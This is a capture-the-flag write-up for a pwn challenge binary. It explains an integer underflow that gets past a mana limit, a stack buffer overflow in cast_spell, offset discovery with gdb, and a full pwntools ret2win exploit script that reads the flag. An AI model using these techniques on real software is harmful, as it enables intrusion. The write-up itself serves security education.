# potion brewing exam

## TLDR
- Integer Underflow, to get total mana >200
- Buffer overflow in function `cast_spell`
- ret2win (`get_ancient_power`)

## Reconnaissance
In the task files we get
- binary file
- source code
- Dockerfile

First we check what we are dealing with.

```console
$ file potion_brewing_exam

potion_brewing_exam: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5b414ea11f14491599cb6a7bec986f03133b3ee7, for GNU/Linux 3.2.0, not stripped
```
```console
$ pwn checksec potion_brewing_exam

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We see that the file is 64-bit and dynamically linked. From the checksec we read that:
- it has a partial `RELRO`.
- no canary
- the `NX` bit is enabled
- base address is fixed

When reviewing the source code, we focus on the `main` function:

```c
int main(void)
{
    int mana = 0;

    setup();
    display_banner();
    
    puts("Welcome to your final potion brewing exam!");
    puts("You must mix the correct ingredients to create a mana potion.");
    puts("Be careful! If you don't follow the recipes, there might be unexpected consequences.");
    puts("You can add up to 4 ingredients.\n");

    for(int i = 0; i < 4; i++)
    {
        char ingredient[32];
        int mana_boost = 0;

        printf("> %d <\n", i+1);
        printf("ingredient: ");
        scanf("%30s", ingredient);
        printf("mana boost: ");
        scanf("%d", &mana_boost);
        if(mana_boost > 50)
        {
            puts("You can't add that ingredient!");
            puts("The potion will be unstable and we don't know what could happen.");
            puts("Exam is over!");
            exit(1);
        }

        mana += mana_boost;
    }

    cast_spell(mana);

    return 0;
}
```

The program asks us for 4 ingredients for a mixture. The name, of the ingredient is not used anywhere, so you can ignore it. The program also asks for the mana of the ingredient, which must not exceed `50`.

Finally, the program calls the `cast_spell` function, with the sum of the mana of all ingredients as an argument.

```c
void cast_spell(int mana)
{
    puts("Great, now let's test your potion!");
    puts("Drink it and cast a spell!");

    char spell[200];
    read(0, spell, mana);
}
```

The function loads into a 200B buffer as many characters as the sum of our mana. If we managed to pass a value larger than 200 to the function, we would have a `buffer overflow` vulnerability.

There is another interesting function in the code: `get_ancient_power`.

```c
void get_ancient_power(void)
{
    char buf[128] = {0};

    int fd = open("flag.txt", O_RDONLY);
    if(fd == -1)
    {
        puts("Can't find flag.txt");
    }

    read(fd, buf, 128);
    puts(buf);

    close(fd);
}
```

It is simply a `win` function that we have to call to get a flag.

## Solution
We already have a mental model of how the task should be solved. If we can gain more mana than 200, then thanks to a buffer overflow vulnerability, we will be able to override the return address of the `cast_spell` function with the `get_ancient_power` address and get the flag. 

The amount of mana, from one component, that we can gain limits this condition:

```c
if(mana_boost > 50)
{
    puts("You can't add that ingredient!");
    puts("The potion will be unstable and we don't know what could happen.");
    puts("Exam is over!");
    exit(1);
}
```

Loading the mana looks like this:
```c
printf("mana boost: ");
scanf("%d", &mana_boost);
```

As we can see, the program loads mana as an integer with a sign, but does not check the lower bound. So we can enter negative values.

The minimum value of int with sign is `-2147483648`. If our mana falls below this value, it will turn into a positive value by virtue of the fact that int is stored on only 4 bytes. So we need at least 2 components with a negative mana value to turn the counter. This is known as the `Integer Underflow`. `Integer Underflow` e.g.:

    1 ingredient:
        mana: -2147483447 [-(INT_MAX-200)]
        total mana: -2147483447
    2 ingredient:
        mana: -2147483447 [-(INT_MAX-200)]
        total mana: ~400
    3 ingredient:
        mana: 0
        total mana: ~400
    4 ingredient:
        mana: 0
        total mana: ~400

This way we get the result we want, while never giving a value greater than `50`.

We can check this with gdb.


```
gef➤  b cast_spell 
Breakpoint 1 at 0x40131a
gef➤  r
```

```
> 1 <
ingredient: A            
mana boost: -2147483447
> 2 <
ingredient: B
mana boost: -2147483447
> 3 <
ingredient: C
mana boost: 0
> 4 <
ingredient: D
mana boost: 0
```

```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401344 <cast_spell+46>  lea    rax, [rbp-0xd0]
     0x40134b <cast_spell+53>  mov    rsi, rax
     0x40134e <cast_spell+56>  mov    edi, 0x0
 →   0x401353 <cast_spell+61>  call   0x401070 <read@plt>
   ↳    0x401070 <read@plt+0>     jmp    QWORD PTR [rip+0x2faa]        # 0x404020 <read@got.plt>
        0x401076 <read@plt+6>     push   0x4
        0x40107b <read@plt+11>    jmp    0x401020
        0x401080 <open@plt+0>     jmp    QWORD PTR [rip+0x2fa2]        # 0x404028 <open@got.plt>
        0x401086 <open@plt+6>     push   0x5
        0x40108b <open@plt+11>    jmp    0x401020
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
read@plt (
   $rdi = 0x0000000000000000,
   $rsi = 0x00007fffffffdb30 → 0x0000003000000008,
   $rdx = 0x0000000000000192
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "potion_brewing_", stopped 0x401353 in cast_spell (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401353 → cast_spell()
[#1] 0x40145e → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Value `rdx` = 0x192 = 402

Now we just need to find the offset needed to override the return address. We can easily do this using the de Bruijn cycle.

```console
$ pwn cyclic 400

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
```

After typing the string into the read function.
```
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc08│+0x0000: "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]"	 ← $rsp
0x00007fffffffdc10│+0x0008: "gaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsa[...]"
0x00007fffffffdc18│+0x0010: "iaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacua[...]"
0x00007fffffffdc20│+0x0018: "kaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwa[...]"
0x00007fffffffdc28│+0x0020: "maacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacya[...]"
0x00007fffffffdc30│+0x0028: "oaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadba[...]"
0x00007fffffffdc38│+0x0030: "qaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaadda[...]"
0x00007fffffffdc40│+0x0038: "saactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfa[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401353 <cast_spell+61>  call   0x401070 <read@plt>
     0x401358 <cast_spell+66>  nop    
     0x401359 <cast_spell+67>  leave  
 →   0x40135a <cast_spell+68>  ret    
[!] Cannot disassemble from $PC
```

```console
$ pwn cyclic -l eaac

216
```

So we need to send 216 bytes of padding followed by the address of the `get_ancient_power` function.

## Final exploit
```py
#!/usr/bin/env python
from pwn import *

##### SPECIFY BINARY #####
elf = context.binary = ELF('../src/potion_brewing_exam')

context.terminal = ['gnome-terminal', '--tab', '--']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        ##### SPECIFY SERVER AND PORT #####
        SERVER = 'localhost'
        PORT = 13371         
        return remote(SERVER, PORT, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

MAX_INT = 2147483647

UNDERFLOW = -(MAX_INT-200)

io.recvuntil(b'ingredient')

io.sendline(b'a')
io.sendline(str(UNDERFLOW).encode())

io.sendline(b'b')
io.sendline(str(UNDERFLOW).encode())

io.sendline(b'c')
io.sendline(b'0')

io.sendline(b'd')
io.sendline(b'0')

spell = flat(
    'A'*216,
    elf.sym['get_ancient_power']
)

io.recvuntil(b'spell!')
io.sendline(spell)

io.interactive()


```

```console
$ python exploit.py REMOTE

flag{testflag}
```
